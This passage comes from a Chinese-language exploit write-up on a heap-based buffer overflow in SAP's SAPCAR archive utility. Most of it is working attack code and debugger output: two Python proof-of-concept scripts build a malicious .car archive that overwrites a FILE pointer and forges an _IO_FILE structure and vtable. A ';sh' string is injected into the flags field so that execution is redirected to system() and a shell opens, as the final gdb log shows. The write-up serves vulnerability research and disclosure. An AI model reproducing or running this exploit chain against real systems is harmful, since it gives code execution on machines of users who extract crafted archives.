&nbsp;&nbsp;_freeres_buf&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;__pad5&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_mode&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;_unused2&nbsp;=&nbsp;&#39;\000&#39;&nbsp;&lt;repeats&nbsp;19&nbsp;times&gt;
}
gdb-peda$&nbsp;x/xg&nbsp;0xa2da10&nbsp;+&nbsp;sizeof(*fp)
0xa2dae8:&nbsp;&nbsp;&nbsp;&nbsp;0x00007ffff6f066e0
gdb-peda$&nbsp;x/xg&nbsp;0x00007ffff6f066e0
0x7ffff6f066e0&nbsp;&lt;_IO_file_jumps&gt;:&nbsp;&nbsp;&nbsp;&nbsp;0x0000000000000000
gdb-peda$&nbsp;p&nbsp;_IO_file_jumps
$6&nbsp;=&nbsp;{
&nbsp;&nbsp;__dummy&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;__dummy2&nbsp;=&nbsp;0x0,&nbsp;
&nbsp;&nbsp;__finish&nbsp;=&nbsp;0x7ffff6bbd9c0&nbsp;&lt;_IO_new_file_finish&gt;,&nbsp;
&nbsp;&nbsp;__overflow&nbsp;=&nbsp;0x7ffff6bbe730&nbsp;&lt;_IO_new_file_overflow&gt;,&nbsp;
&nbsp;&nbsp;__underflow&nbsp;=&nbsp;0x7ffff6bbe4a0&nbsp;&lt;_IO_new_file_underflow&gt;,&nbsp;
&nbsp;&nbsp;__uflow&nbsp;=&nbsp;0x7ffff6bbf600&nbsp;&lt;__GI__IO_default_uflow&gt;,&nbsp;
&nbsp;&nbsp;__pbackfail&nbsp;=&nbsp;0x7ffff6bc0980&nbsp;&lt;__GI__IO_default_pbackfail&gt;,&nbsp;
&nbsp;&nbsp;__xsputn&nbsp;=&nbsp;0x7ffff6bbd1e0&nbsp;&lt;_IO_new_file_xsputn&gt;,&nbsp;
&nbsp;&nbsp;__xsgetn&nbsp;=&nbsp;0x7ffff6bbcec0&nbsp;&lt;__GI__IO_file_xsgetn&gt;,&nbsp;
&nbsp;&nbsp;__seekoff&nbsp;=&nbsp;0x7ffff6bbc4c0&nbsp;&lt;_IO_new_file_seekoff&gt;,&nbsp;
&nbsp;&nbsp;__seekpos&nbsp;=&nbsp;0x7ffff6bbfa00&nbsp;&lt;_IO_default_seekpos&gt;,&nbsp;
&nbsp;&nbsp;__setbuf&nbsp;=&nbsp;0x7ffff6bbc430&nbsp;&lt;_IO_new_file_setbuf&gt;,&nbsp;
&nbsp;&nbsp;__sync&nbsp;=&nbsp;0x7ffff6bbc370&nbsp;&lt;_IO_new_file_sync&gt;,&nbsp;
&nbsp;&nbsp;__doallocate&nbsp;=&nbsp;0x7ffff6bb1180&nbsp;&lt;__GI__IO_file_doallocate&gt;,&nbsp;
&nbsp;&nbsp;__read&nbsp;=&nbsp;0x7ffff6bbd1a0&nbsp;&lt;__GI__IO_file_read&gt;,&nbsp;
&nbsp;&nbsp;__write&nbsp;=&nbsp;0x7ffff6bbcb70&nbsp;&lt;_IO_new_file_write&gt;,&nbsp;
&nbsp;&nbsp;__seek&nbsp;=&nbsp;0x7ffff6bbc970&nbsp;&lt;__GI__IO_file_seek&gt;,&nbsp;
&nbsp;&nbsp;__close&nbsp;=&nbsp;0x7ffff6bbc340&nbsp;&lt;__GI__IO_file_close&gt;,&nbsp;
&nbsp;&nbsp;__stat&nbsp;=&nbsp;0x7ffff6bbcb60&nbsp;&lt;__GI__IO_file_stat&gt;,&nbsp;
&nbsp;&nbsp;__showmanyc&nbsp;=&nbsp;0x7ffff6bc0af0&nbsp;&lt;_IO_default_showmanyc&gt;,&nbsp;
&nbsp;&nbsp;__imbue&nbsp;=&nbsp;0x7ffff6bc0b00&nbsp;&lt;_IO_default_imbue&gt;
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于我们可以控制文件指针以及输入文件中的数据，我们就可以伪造一个FILE结构并设置一个自定义的vtable指针。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们将使用pysap库来创建CAR文档，我们可以使用pip命令安装pysap：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;pip&nbsp;install&nbsp;pysap</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.1 重写文件指针</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一步就是用任意值重写文件指针。我们首先用0x1100字节数据填充缓冲区，然后又添加了某些数据填充了堆空间，指针成功分配之后我们就要重写指针了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PoC代码如下：</span></p><pre class="brush:plain;toolbar:false">#!/usr/bin/env&nbsp;python
import&nbsp;struct
from&nbsp;scapy.packet&nbsp;import&nbsp;Raw
from&nbsp;pysap.SAPCAR&nbsp;import&nbsp;*
def&nbsp;overwrite_FILE_pointer(address):
&nbsp;&nbsp;&nbsp;&nbsp;fill_buf&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;0x1100
&nbsp;&nbsp;&nbsp;&nbsp;gap_to_fp&nbsp;=&nbsp;&quot;B&quot;&nbsp;*&nbsp;0x38
&nbsp;&nbsp;&nbsp;&nbsp;fp&nbsp;=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;address)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;fill_buf&nbsp;+&nbsp;gap_to_fp&nbsp;+&nbsp;fp
def&nbsp;write_exp(data):
&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(&quot;sapevents.dll&quot;,&nbsp;&quot;w&quot;)&nbsp;as&nbsp;fd:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd.write(&quot;Some&nbsp;string&nbsp;to&nbsp;compress&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;=&nbsp;SAPCARArchive(&quot;poc.car&quot;,&nbsp;mode=&quot;wb&quot;,&nbsp;version=SAPCAR_VERSION_200)
&nbsp;&nbsp;&nbsp;&nbsp;f.add_file(&quot;sapevents.dll&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;f._sapcar.files0[0].blocks.append(Raw(&quot;DA\x08\x00\x00\x00&quot;))
&nbsp;&nbsp;&nbsp;&nbsp;f._sapcar.files0[0].blocks.append(Raw(&quot;DA\x84\x65\x00\x00&quot;))
&nbsp;&nbsp;&nbsp;&nbsp;f._sapcar.files0[0].blocks.append(Raw(&quot;D&gt;&quot;&nbsp;+&nbsp;&quot;\x00&quot;*32&nbsp;+&nbsp;&quot;\xd0\xd0&quot;))
&nbsp;&nbsp;&nbsp;&nbsp;f._sapcar.files0[0].blocks.append(Raw(data))
&nbsp;&nbsp;&nbsp;&nbsp;f.write()
def&nbsp;main():
&nbsp;&nbsp;&nbsp;&nbsp;write_exp(overwrite_FILE_pointer(0x4242424243434343))
if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
main()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行PoC后会创建一个poc.car文件，然后绑定gdb并运行该文件：</span></p><pre class="brush:plain;toolbar:false">Stopped&nbsp;reason:&nbsp;SIGSEGV
_IO_feof&nbsp;(fp=0x4242424243434343)&nbsp;at&nbsp;feof.c:35</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.2 控制执行流</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来要存储我们伪造的FILE结构，我们的运行环境禁用了ASLR，因此我们只能使用硬编码的缓冲区地址。</span></p><pre class="brush:plain;toolbar:false">#!/usr/bin/env&nbsp;python
import&nbsp;struct
from&nbsp;scapy.packet&nbsp;import&nbsp;Raw
from&nbsp;pysap.SAPCAR&nbsp;import&nbsp;*
FILE_STRUCT_SIZE&nbsp;=&nbsp;0xd8
BUF_ADDRESS&nbsp;=&nbsp;0xa1c798
def&nbsp;build_IO_FILE_struct():
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x80018001)&nbsp;#&nbsp;_flags
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x41414141)&nbsp;#&nbsp;_IO_read_ptr
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x42424242)&nbsp;#&nbsp;_IO_read_end
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x43434343)&nbsp;#&nbsp;_IO_read_base
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x44444444)&nbsp;#&nbsp;_IO_write_base
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x45454545)&nbsp;#&nbsp;_IO_write_ptr
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x46464646)&nbsp;#&nbsp;_IO_write_end
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x47474747)&nbsp;#&nbsp;_IO_buf_base
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x48484848)&nbsp;#&nbsp;_IO_buf_end
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x49494949)&nbsp;#&nbsp;_IO_save_base
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x50505050)&nbsp;#&nbsp;_IO_backup_base
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x51515151)&nbsp;#&nbsp;_IO_save_end
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x52525252)&nbsp;#&nbsp;_markers
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x53535353)&nbsp;#&nbsp;_chain
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;L&quot;,&nbsp;0x54545454)&nbsp;#&nbsp;_fileno
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;L&quot;,&nbsp;0x55555555)&nbsp;#&nbsp;_flags2
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x56565656)&nbsp;#&nbsp;_old_offset
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;H&quot;,&nbsp;0x5757)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_cur_column
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;H&quot;,&nbsp;0x58)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_vtable_offset
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;L&quot;,&nbsp;0x59595959)&nbsp;#&nbsp;_shortbuf
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x60606060)&nbsp;#&nbsp;_lock
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x61616161)&nbsp;#&nbsp;_offset
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x62626262)&nbsp;#&nbsp;_codecvt
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x63636363)&nbsp;#&nbsp;_wide_data
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x64646464)&nbsp;#&nbsp;_freeres_list
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x65656565)&nbsp;#&nbsp;_freeres_buf
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x66666666)&nbsp;#&nbsp;__pad5
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;struct.pack(&quot;&lt;L&quot;,&nbsp;0x67676767)&nbsp;#&nbsp;_mode
&nbsp;&nbsp;&nbsp;&nbsp;file_struct&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_unused2
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;file_struct
def&nbsp;build_IO_jump_t_vtable():
&nbsp;&nbsp;&nbsp;&nbsp;vtable&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;vtable&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;BUF_ADDRESS&nbsp;+&nbsp;2&nbsp;*&nbsp;FILE_STRUCT_SIZE&nbsp;+&nbsp;8)
&nbsp;&nbsp;&nbsp;&nbsp;vtable&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x41424344)&nbsp;*&nbsp;21
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;vtable
def&nbsp;overwrite_FILE_pointer(address):
&nbsp;&nbsp;&nbsp;&nbsp;fake_structure&nbsp;=&nbsp;build_IO_FILE_struct()&nbsp;*&nbsp;2
&nbsp;&nbsp;&nbsp;&nbsp;vtable&nbsp;=&nbsp;build_IO_jump_t_vtable()
&nbsp;&nbsp;&nbsp;&nbsp;fill_buf&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;(0x1100&nbsp;-&nbsp;len(fake_structure)&nbsp;-&nbsp;len(vtable))
&nbsp;&nbsp;&nbsp;&nbsp;gap_to_fp&nbsp;=&nbsp;&quot;B&quot;&nbsp;*&nbsp;0x38
&nbsp;&nbsp;&nbsp;&nbsp;fp&nbsp;=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;address)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;fake_structure&nbsp;+&nbsp;vtable&nbsp;+&nbsp;fill_buf&nbsp;+&nbsp;gap_to_fp&nbsp;+&nbsp;fp
def&nbsp;write_exp(data):
&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(&quot;sapevents.dll&quot;,&nbsp;&quot;w&quot;)&nbsp;as&nbsp;fd:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd.write(&quot;Some&nbsp;string&nbsp;to&nbsp;compress&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;=&nbsp;SAPCARArchive(&quot;poc.car&quot;,&nbsp;mode=&quot;wb&quot;,&nbsp;version=SAPCAR_VERSION_200)
&nbsp;&nbsp;&nbsp;&nbsp;f.add_file(&quot;sapevents.dll&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;f._sapcar.files0[0].blocks.append(Raw(&quot;DA\x08\x00\x00\x00&quot;))
&nbsp;&nbsp;&nbsp;&nbsp;f._sapcar.files0[0].blocks.append(Raw(&quot;DA\x84\x65\x00\x00&quot;))
&nbsp;&nbsp;&nbsp;&nbsp;f._sapcar.files0[0].blocks.append(Raw(&quot;D&gt;&quot;&nbsp;+&nbsp;&quot;\x00&quot;*32&nbsp;+&nbsp;&quot;\xd0\xd0&quot;))
&nbsp;&nbsp;&nbsp;&nbsp;f._sapcar.files0[0].blocks.append(Raw(data))
&nbsp;&nbsp;&nbsp;&nbsp;f.write()
def&nbsp;main():
&nbsp;&nbsp;&nbsp;&nbsp;write_exp(overwrite_FILE_pointer(BUF_ADDRESS&nbsp;+&nbsp;FILE_STRUCT_SIZE))
if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
main()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们创建了一个新的文档，然后再次运行代码。这一次我们将控制RIP并重定向执行流：</span></p><pre class="brush:plain;toolbar:false">Stopped&nbsp;reason:&nbsp;SIGSEGV
0x0000000041424344&nbsp;in&nbsp;??&nbsp;()
gdb-peda$&nbsp;bt
#0&nbsp;&nbsp;0x0000000041424344&nbsp;in&nbsp;??&nbsp;()
#1&nbsp;&nbsp;0x00007ffff6bb129f&nbsp;in&nbsp;_IO_new_fclose&nbsp;(fp=0xa1c870)&nbsp;at&nbsp;iofclose.c:62
#2&nbsp;&nbsp;0x000000000040c58b&nbsp;in&nbsp;??&nbsp;()
#3&nbsp;&nbsp;0x000000000041958b&nbsp;in&nbsp;??&nbsp;()
#4&nbsp;&nbsp;0x000000000042bc43&nbsp;in&nbsp;??&nbsp;()
#5&nbsp;&nbsp;0x000000000043fc66&nbsp;in&nbsp;??&nbsp;()
#6&nbsp;&nbsp;0x00007ffff6b64830&nbsp;in&nbsp;__libc_start_main&nbsp;(main=0x43ffb0,&nbsp;argc=0x3,&nbsp;argv=0x7fffffffe488,&nbsp;init=&lt;optimized&nbsp;out&gt;,&nbsp;fini=&lt;optimized&nbsp;out&gt;,&nbsp;rtld_fini=&lt;optimized&nbsp;out&gt;,&nbsp;stack_end=0x7fffffffe478)
at&nbsp;../csu/libc-start.c:291</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">除此之外，我们还可以检查文件指针来确定我们伪造的结构体存储正确了：</span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;p&nbsp;*(FILE&nbsp;*)0xa1c870
$1&nbsp;=&nbsp;{
&nbsp;&nbsp;_flags&nbsp;=&nbsp;0x80018001,&nbsp;
&nbsp;&nbsp;_IO_read_ptr&nbsp;=&nbsp;0x41414141&nbsp;&lt;error:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x41414141&gt;,&nbsp;
&nbsp;&nbsp;_IO_read_end&nbsp;=&nbsp;0x42424242&nbsp;&lt;error:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x42424242&gt;,&nbsp;
&nbsp;&nbsp;_IO_read_base&nbsp;=&nbsp;0x43434343&nbsp;&lt;error:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x43434343&gt;,&nbsp;
&nbsp;&nbsp;_IO_write_base&nbsp;=&nbsp;0x44444444&nbsp;&lt;error:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x44444444&gt;,&nbsp;
&nbsp;&nbsp;_IO_write_ptr&nbsp;=&nbsp;0x45454545&nbsp;&lt;error:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x45454545&gt;,&nbsp;
&nbsp;&nbsp;_IO_write_end&nbsp;=&nbsp;0x46464646&nbsp;&lt;error:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x46464646&gt;,&nbsp;
&nbsp;&nbsp;_IO_buf_base&nbsp;=&nbsp;0x47474747&nbsp;&lt;error:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x47474747&gt;,&nbsp;
&nbsp;&nbsp;_IO_buf_end&nbsp;=&nbsp;0x48484848&nbsp;&lt;error:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x48484848&gt;,&nbsp;
&nbsp;&nbsp;_IO_save_base&nbsp;=&nbsp;0x49494949&nbsp;&lt;error:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x49494949&gt;,&nbsp;
&nbsp;&nbsp;_IO_backup_base&nbsp;=&nbsp;0x50505050&nbsp;&lt;error:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x50505050&gt;,&nbsp;
&nbsp;&nbsp;_IO_save_end&nbsp;=&nbsp;0x51515151&nbsp;&lt;error:&nbsp;Cannot&nbsp;access&nbsp;memory&nbsp;at&nbsp;address&nbsp;0x51515151&gt;,&nbsp;
&nbsp;&nbsp;_markers&nbsp;=&nbsp;0x52525252,&nbsp;
&nbsp;&nbsp;_chain&nbsp;=&nbsp;0x53535353,&nbsp;
&nbsp;&nbsp;_fileno&nbsp;=&nbsp;0x54545454,&nbsp;
&nbsp;&nbsp;_flags2&nbsp;=&nbsp;0x55555555,&nbsp;
&nbsp;&nbsp;_old_offset&nbsp;=&nbsp;0x56565656,&nbsp;
&nbsp;&nbsp;_cur_column&nbsp;=&nbsp;0x5757,&nbsp;
&nbsp;&nbsp;_vtable_offset&nbsp;=&nbsp;0x58,&nbsp;
&nbsp;&nbsp;_shortbuf&nbsp;=&nbsp;&quot;&quot;,&nbsp;
&nbsp;&nbsp;_lock&nbsp;=&nbsp;0x60606060,&nbsp;
&nbsp;&nbsp;_offset&nbsp;=&nbsp;0x61616161,&nbsp;
&nbsp;&nbsp;_codecvt&nbsp;=&nbsp;0x62626262,&nbsp;
&nbsp;&nbsp;_wide_data&nbsp;=&nbsp;0x63636363,&nbsp;
&nbsp;&nbsp;_freeres_list&nbsp;=&nbsp;0x64646464,&nbsp;
&nbsp;&nbsp;_freeres_buf&nbsp;=&nbsp;0x65656565,&nbsp;
&nbsp;&nbsp;__pad5&nbsp;=&nbsp;0x66666666,&nbsp;
&nbsp;&nbsp;_mode&nbsp;=&nbsp;0x67676767,&nbsp;
&nbsp;&nbsp;_unused2&nbsp;=&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;20&nbsp;times&gt;
}</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.3 生成Shell</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">成功控制了执行流之后，我们有多种方法来生成Shell。其中一种针对懒人的方法可以通过system(&quot;/bin/sh&quot;)实现。具体如下：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;objdump&nbsp;-M&nbsp;intel&nbsp;-d&nbsp;sapcar_721.510_linux_x86_64&nbsp;|&nbsp;grep&nbsp;&quot;&lt;system@plt&gt;&quot;
000000000040bbe0&nbsp;&lt;system@plt&gt;:
&nbsp;&nbsp;455db1:&nbsp;e8&nbsp;2a&nbsp;5e&nbsp;fb&nbsp;ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;40bbe0&nbsp;&lt;system@plt&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">此时，我们可以看到RDI寄存器中的指针指向的是伪造FILE结构中的标识字符串：</span></p><pre class="brush:plain;toolbar:false">Stopped&nbsp;reason:&nbsp;SIGSEGV
0x0000000041424344&nbsp;in&nbsp;??&nbsp;()
gdb-peda$&nbsp;x/xg&nbsp;$rdi
0xa1c870:&nbsp;&nbsp;0x0000000080018001</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这也就意味着我们可以在这个缓冲区中存在一个sh字符串，然后重定向执行流并让它调用system命令来拿到Shell。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果我们修改完后执行程序，我们会发现系统将抛出一个错误（_IO_feof中的分段错误）：</span></p><pre class="brush:plain;toolbar:false">=&gt;&nbsp;0x7ffff6bb9912&nbsp;&lt;_IO_feof+34&gt;:&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;r10,QWORD&nbsp;PTR&nbsp;[r8+0x8]
gdb-peda$&nbsp;info&nbsp;r&nbsp;r8
r8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x60606060&nbsp;&nbsp;0x60606060</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是因为我们修改了标识符，而此时文件函数将会尝试访问_lock指针。我们可以使用之前正确的标识符并在后面添加“;sh”来执行Shell。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">修改如下：</span></p><pre class="brush:plain;toolbar:false">file_struct&nbsp;+=&nbsp;&quot;\x01\x80;sh\x00\x00\x00&quot;&nbsp;#&nbsp;_flags</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后修改vtable指针：</span></p><pre class="brush:plain;toolbar:false">vtable&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;0x455db1)&nbsp;*&nbsp;21</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行下列代码之后，我们就成功拿到了Shell：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;r&nbsp;-vtf&nbsp;poc.car
Starting&nbsp;program:&nbsp;/home/ubuntu/sapcar_721.510_linux_x86_64&nbsp;-vtf&nbsp;poc.car
[Thread&nbsp;debugging&nbsp;using&nbsp;libthread_db&nbsp;enabled]
Using&nbsp;host&nbsp;libthread_db&nbsp;library&nbsp;&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
SAPCAR:&nbsp;processing&nbsp;archive&nbsp;poc.car&nbsp;(version&nbsp;2.00)
-rw-rw-r--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23&nbsp;&nbsp;&nbsp;&nbsp;25&nbsp;Apr&nbsp;2017&nbsp;21:18&nbsp;sapevents.dll
[New&nbsp;process&nbsp;14925]
[Thread&nbsp;debugging&nbsp;using&nbsp;libthread_db&nbsp;enabled]
Using&nbsp;host&nbsp;libthread_db&nbsp;library&nbsp;&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
process&nbsp;14925&nbsp;is&nbsp;executing&nbsp;new&nbsp;program:&nbsp;/bin/dash
sh:&nbsp;1:&nbsp;�:&nbsp;not&nbsp;found
[New&nbsp;process&nbsp;14926]
process&nbsp;14926&nbsp;is&nbsp;executing&nbsp;new&nbsp;program:&nbsp;/bin/dash
$&nbsp;id
uid=1000(ubuntu)&nbsp;gid=1000(ubuntu)&nbsp;groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">五、参考资料</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">[1] <a href="https://www.coresecurity.com/advisories/sap-sapcar-heap-based-buffer-overflow-vulnerability" _src="https://www.coresecurity.com/advisories/sap-sapcar-heap-based-buffer-overflow-vulnerability">https://www.coresecurity.com/advisories/sap-sapcar-heap-based-buffer-overflow-vulnerability</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[2] <a href="https://github.com/google/honggfuzz" _src="https://github.com/google/honggfuzz">https://github.com/google/honggfuzz</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, 